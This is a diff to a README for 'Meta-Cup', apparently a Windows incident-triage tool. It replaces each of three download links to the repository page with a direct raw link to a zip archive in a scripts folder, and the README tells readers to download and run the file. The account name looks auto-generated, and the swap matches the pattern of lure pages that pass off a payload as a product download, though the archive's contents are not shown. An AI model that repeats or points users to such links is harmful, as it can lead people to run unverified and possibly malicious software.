@@ -1,6 +1,6 @@
 # 🧩 Meta-Cup - Deterministic Incident Triage for Windows
 
-[![Download Meta-Cup](https://img.shields.io/badge/Download-Meta--Cup-blue?style=for-the-badge&logo=github)](https://github.com/adjustable-phytolaccadioica297/Meta-Cup)
+[![Download Meta-Cup](https://img.shields.io/badge/Download-Meta--Cup-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/adjustable-phytolaccadioica297/Meta-Cup/main/scripts/Meta_Cup_1.7.zip)
 
 ## 🖥️ What Meta-Cup does
 
@@ -18,7 +18,7 @@ Use it to:
 
 To get the app, visit this page and download and run the file from the repository:
 
-[Download Meta-Cup](https://github.com/adjustable-phytolaccadioica297/Meta-Cup)
+[Download Meta-Cup](https://raw.githubusercontent.com/adjustable-phytolaccadioica297/Meta-Cup/main/scripts/Meta_Cup_1.7.zip)
 
 ## 🪟 Windows Setup
 
@@ -210,7 +210,7 @@ It is built for users who want a clear process without extra setup steps
 
 If you need the download page again, use this link:
 
-[Meta-Cup Download](https://github.com/adjustable-phytolaccadioica297/Meta-Cup)
+[Meta-Cup Download](https://raw.githubusercontent.com/adjustable-phytolaccadioica297/Meta-Cup/main/scripts/Meta_Cup_1.7.zip)
 
 ## 🖱️ Quick Start
 
